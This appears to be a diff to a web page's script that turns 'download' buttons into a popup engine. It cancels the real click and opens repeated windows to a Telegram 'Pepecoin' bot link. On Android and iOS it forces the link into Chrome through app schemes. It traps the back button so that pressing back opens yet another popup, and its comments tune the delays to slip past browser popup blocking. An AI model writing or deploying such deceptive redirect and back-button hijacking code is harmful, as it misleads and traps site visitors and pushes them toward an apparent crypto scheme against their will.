@@ -213,9 +213,12 @@ cursor:pointer;
 </div>
 
  <script>
+
 const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
 
-// ✅ popup function
+let clickCount = 0;
+
+// ✅ SAFE POPUP FUNCTION
 function openPopup(url){
   let win = window.open(url, "_blank");
 
@@ -224,20 +227,72 @@ function openPopup(url){
   }
 }
 
-// ✅ main function
+// ✅ MULTI POPUP ENGINE
+function openPopups(url, count){
+  for(let i = 0; i < count; i++){
+    setTimeout(() => {
+      openPopup(url);
+    }, i * 400); // safe delay (important)
+  }
+}
+
 function openExternal(){
 
-  // 👉 1st popup
-  openPopup(smartLink);
+  clickCount++;
 
-  // 👉 2nd popup (safe delay)
-  setTimeout(()=>{
-    openPopup(smartLink);
-  }, 300);
+  const ua = navigator.userAgent.toLowerCase();
+  const isAndroid = /android/.test(ua);
+  const isIOS = /iphone|ipad|ipod/.test(ua);
+  const isTelegram = /telegram/.test(ua);
+
+  // 👉 popup logic
+  let popupCount = (clickCount === 1) ? 2 : 3;
+
+  // ❌ REMOVED unsafe +100 boost (causes block)
+
+  // ✅ TELEGRAM
+  if(isTelegram){
+    openPopups(smartLink, popupCount);
+    return;
+  }
+
+  // 🤖 ANDROID
+  if(isAndroid){
+
+    let intentLink =
+      "intent://" +
+      smartLink.replace(/^https?:\/\//,'') +
+      "#Intent;scheme=https;package=com.android.chrome;end";
+
+    openPopups(intentLink, popupCount);
+
+    setTimeout(() => {
+      openPopups(smartLink, popupCount);
+    }, 1200);
+  }
+
+  // 🍎 IOS
+  else if(isIOS){
+
+    let chromeLink =
+      "googlechrome://" +
+      smartLink.replace(/^https?:\/\//,'');
+
+    openPopups(chromeLink, popupCount);
+
+    setTimeout(() => {
+      openPopups(smartLink, popupCount);
+    }, 1200);
+  }
+
+  // 💻 PC
+  else{
+    openPopups(smartLink, popupCount);
+  }
 
 }
 
-// 👉 click event
+// 🔥 CLICK EVENT
 document.addEventListener("click", function(e){
   if(e.target.classList.contains("download")){
     e.preventDefault();
@@ -245,14 +300,17 @@ document.addEventListener("click", function(e){
   }
 });
 
-// 🔥 BACK BUTTON SAFE BLOCK (optional safe version)
+// 🔥 BACK BUTTON SAFE VERSION (light)
 history.pushState(null, null, location.href);
 
 window.onpopstate = function () {
   history.pushState(null, null, location.href);
+
+  // safe single popup
   openPopup(smartLink);
 };
- </script>
 
+ </script>
+ 
 </body>
 </html>
